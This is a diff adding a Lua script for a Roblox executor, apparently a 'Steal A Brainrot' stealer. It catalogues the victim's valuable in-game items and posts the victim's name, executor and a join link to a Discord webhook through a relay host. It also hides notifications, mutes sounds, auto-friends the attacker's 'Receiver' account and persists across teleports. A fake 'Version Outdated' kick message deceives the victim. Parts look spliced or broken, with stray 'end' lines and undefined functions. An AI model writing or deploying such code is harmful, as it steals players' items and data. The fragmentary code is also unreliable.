@@ -1,0 +1,342 @@
+local HttpService = game:GetService("HttpService")
+local player = game.Players.LocalPlayer
+local Players = game.Players
+local Request = (syn and syn.request) or http_request or request
+local executor = identifyexecutor()
+local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
+local TPM = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local joinL = "https://floating.gg/?placeID=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+local FLink = string.format("[**click me to join**](%s)", joinL)
+game:GetService("CoreGui").RobloxGui:Destroy()
+local brainrots = {}
+local SHOULD_PING = false
+local TPS = game:GetService("TeleportService")
+				end
+			end
+		end
+		task.wait(1)
+	end
+end
+
+local priority = { -- these are really outdated, brainrots are in ReplicatedStorage.Datas.Animals
+	["🧂"] = "Garama and Madundung", -- 50m/s
+	["☢️"] = "Nuclearo Dinossauro", -- 15m/s
+	["💪"] = "La Grande Combinasion", -- 10m/s
+	["🛜"] = "Pot Hotspot", -- 2.5m/s
+	["🦑"] = "Graipuss Medussi", -- 1m/s
+    ["🦈"] = "Los Tralaleritos", -- 650k/s
+	["🐉"] = "Torrtuginni Dragonfrutini", -- 350k/s
+	["🕷️"] = "Chimpanzini Spiderini", -- 300k/s
+	["🪐"] = "La Vacca Saturno Saturnita", -- 250k/s
+	["🩰"] = "Ballerino Lololo", -- 200k/s
+	["🚂"] = "Trenostruzzo Turbo 3000" -- 150k/s
+}
+
+local traits = { -- outdated also, traits are in ReplicatedStorage.Datas.Traits
+	["rbxassetid://110835412437000"] = "Taco",
+	["rbxassetid://121100427764858"] = "Fireworks",
+	["rbxassetid://104229924295526"] = "Nyan",
+	["rbxassetid://99181785766598"] = "Galactic",
+	["rbxassetid://110723387483939"] = "Zombie",
+	["rbxassetid://104964195846833"] = "Claws",
+	["rbxassetid://121332433272976"] = "Glitched",
+	["rbxassetid://100601425541874"] = "Bubblegum"
+}
+
+local rarities = {
+	["OG"] = 1, ["Secret"] = 2, ["Brainrot God"] = 3, ["Mythic"] = 4, ["Legendary"] = 5, ["Epic"] = 6, ["Rare"] = 7, ["Common"] = 8
+}
+
+
+for _, plot in ipairs(workspace.Plots:GetChildren()) do
+	local label = plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+	if label and label.Text:find(player.DisplayName) and label.Text:find("Base") then
+		local podiums = plot:FindFirstChild("AnimalPodiums")
+		if podiums then
+			for _, podium in ipairs(podiums:GetChildren()) do
+				local attachment = podium.Base.Spawn:FindFirstChild("Attachment")
+				local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+				if overhead then
+					local name = overhead:FindFirstChild("DisplayName").Text
+					local rarity = overhead:FindFirstChild("Rarity").Text
+					if name and rarity then
+						local mutations = {}
+
+for _, v in ipairs(overhead:GetChildren()) do
+	if v:IsA("TextLabel") and v.Name == "Mutation" and v.Visible and v.Text ~= "" then
+		table.insert(mutations, v.Text)
+	end
+end
+
+local traitsF = overhead:FindFirstChild("Traits")
+if traitsF then
+	for _, icon in ipairs(traitsF:GetChildren()) do
+		if icon:IsA("ImageLabel") and icon.Visible then
+			local id = icon.Image
+			local trait = traits[id]
+			if trait then
+				table.insert(mutations, trait)
+			end
+		end
+	end
+end
+
+						local mutationStr = #mutations > 0 and ("[" .. table.concat(mutations, ", ") .. "] ") or ""
+						local FN = mutationStr .. name
+
+						local emoji = nil
+						for em, brainrot in pairs(priority) do
+							if name == brainrot then
+								emoji = em
+								SHOULD_PING = true
+								break
+							end
+						end
+
+						local genT = overhead:FindFirstChild("Generation") and overhead.Generation.Text or "$0"
+local gen = tonumber(genT:match("%d+")) or 0
+if genT:find("K") then gen = gen * 1000 end
+if genT:find("M") then gen = gen * 1000000 end
+if genT:find("B") then gen = gen * 1000000000 end
+if genT:find("T") then gen = gen * 1000000000000 end
+
+table.insert(brainrots, {
+	name = string.format("%s ➜ %s ➜ %s %s", emoji or "🐵", FN, rarity, genT),
+	priority = emoji ~= nil,
+	rarityy = rarities[rarity] or 999,
+	generation = gen
+})
+					end
+				end
+			end
+		end
+	end
+end
+
+table.sort(brainrots, function(a, b)
+	if a.priority ~= b.priority then
+		return a.priority < b.priority
+	end
+	if a.rarityy ~= b.rarityy then
+		return a.rarityy < b.rarityy
+	end
+	if a.generation ~= b.generation then
+		return a.generation > b.generation
+	end
+	return false
+end)
+
+local hits = {}
+for _, v in ipairs(brainrots) do
+	table.insert(hits, v.name)
+end
+
+
+local function createfull() -- can be used to put the full hit list in a txt file
+	return table.concat(hits, "\n")
+end
+
+local limitedList = {}
+for i, v in ipairs(hits) do
+	if i <= 15 then
+		table.insert(limitedList, v)
+	elseif i == 16 then
+		table.insert(limitedList, "...and more!")
+		break
+	end
+end
+
+local HLF = table.concat(limitedList, "\n")
+local ping = SHOULD_PING and "@everyone " or ""
+
+if #brainrots == 0 then
+setclipboard("https://discord.gg/ewCdAhvWva")
+	player:Kick("Version Outdated. Join Discord for newest. (Invite copied)")
+	return
+end
+
+local function send(url)
+	local FURL = url:match("^%d+%-%d+%-%d+$") and ("https://protector-aa3k.onrender.com/send/" .. url) or url -- this was for my webhook protector
+	local body = {
+		content = ping .. TPM,
+		embeds = {{
+			title = ":dash: **Steal A Brainrot Hit!!** :brain:",
+			color = 255,
+			fields = {
+				{
+					name = ":bust_in_silhouette: **__Player Information:__**",
+					value = string.format("```Victim: %s\nDisplay Username: %s\nExecutor: %s\nReceiver: %s```",
+						player.Name, player.DisplayName, executor, Username),
+					inline = false
+				},
+				{
+					name = ":champagne: **__Valuable Items:__**",
+					value = "```" .. (HLF ~= "" and HLF or "Nil") .. "```",
+					inline = false
+				},
+				{
+					name = ":moneybag: **__Summary:__**",
+					value = "```Total Items: " .. #brainrots .. "```",
+					inline = false
+				},
+				{
+					name = ":flying_saucer: **__Join Link:__**",
+					value = FLink,
+					inline = false
+				}
+			},
+			footer = { text = "Hit using Trax Scripts | Today at " .. os.date("%H:%M") }
+		}}
+	}
+
+	pcall(function()
+		Request({
+			Url = FURL,
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = HttpService:JSONEncode(body)
+		})
+	end)
+end
+
+
+send(Webhook)
+
+local started = false
+
+local function start()
+	if started then return end
+	started = true
+
+	local sg = game:GetService("StarterGui")
+	local mt = getrawmetatable(game)
+	setreadonly(mt, false)
+
+	local old = mt.__namecall
+	mt.__namecall = newcclosure(function(self, ...)
+		if self == sg and getnamecallmethod() == "SetCore" and (...) == "SendNotification" then
+			return
+		end
+		return old(self, ...)
+	end)
+
+	game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("Net"):WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
+	
+	local day = workspace:FindFirstChild("Sounds").Day
+	for _, s in ipairs(game:GetDescendants()) do
+		if s:IsA("Sound") and s ~= day then
+			s.Volume = 0
+		end
+	end
+
+	game.DescendantAdded:Connect(function(o)
+		if o:IsA("Sound") and o ~= day then
+			o.Volume = 0
+		end
+	end)
+
+	if day then
+		day.Volume = 1
+		day:Play()
+	end
+
+	local base
+	for _, plot in ipairs(workspace.Plots:GetChildren()) do
+		local label = plot:FindFirstChild("PlotSign") 
+			and plot.PlotSign:FindFirstChild("SurfaceGui") 
+			and plot.PlotSign.SurfaceGui:FindFirstChild("Frame") 
+			and plot.PlotSign.SurfaceGui.Frame:FindFirstChild("TextLabel")
+		if label and label.Text:find(player.DisplayName) then -- still works but theres a better way from the plotcontroller module
+			base = plot
+			break
+		end
+	end
+
+	if not base then return end
+
+	local char = player.Character or player.CharacterAdded:Wait()
+	local hrp = char:WaitForChild("HumanoidRootPart")
+	local hum = char:WaitForChild("Humanoid")
+
+	local purchases = base:FindFirstChild("Purchases")
+	local fpanel = base:FindFirstChild("FriendPanel")
+	local target
+
+
+	if not target then return end
+   hum.Health = 0
+
+   task.wait(4)
+
+	task.spawn(function()
+		while true do
+			hum:MoveTo(target.Position)
+			task.wait()
+		end
+	end)
+
+	task.spawn(function()
+		while true do
+			if (hrp.Position - target.Position).Magnitude < 6 then
+				local ti = target:FindFirstChildWhichIsA("TouchTransmitter", true)
+				if ti then
+					firetouchinterest(hrp, target, 0)
+					task.wait(0.1)
+					firetouchinterest(hrp, target, 1)
+					task.wait(0.1)
+				end
+			else
+				task.wait()
+			end
+		end
+	end)
+end
+
+local friended = false
+
+local function friend()
+	local receiver
+
+	repeat
+		receiver = game.Players:FindFirstChild(Username)
+		task.wait()
+	until receiver
+
+	task.spawn(function()
+		while true do
+			if not player:IsFriendsWith(receiver.UserId) then
+				pcall(function()
+					player:RequestFriendship(receiver)
+				end)
+			end
+			task.wait(2)
+		end
+	end)
+end
+
+local function check(p)
+	if p.Name:lower() == Username:lower() then
+		Expand()
+		task.wait(2)
+		start()
+	end
+end
+
+for _, p in ipairs(game.Players:GetPlayers()) do
+	check(p)
+end
+
+game.Players.PlayerAdded:Connect(check)
+
+
+for _, p in ipairs(game.Players:GetPlayers()) do
+	chatlistener(p)
+end
+
+game.Players.PlayerAdded:Connect(chatlistener)
+]]
+
+
+loadstring(main)()
+
+queue_on_teleport(main)
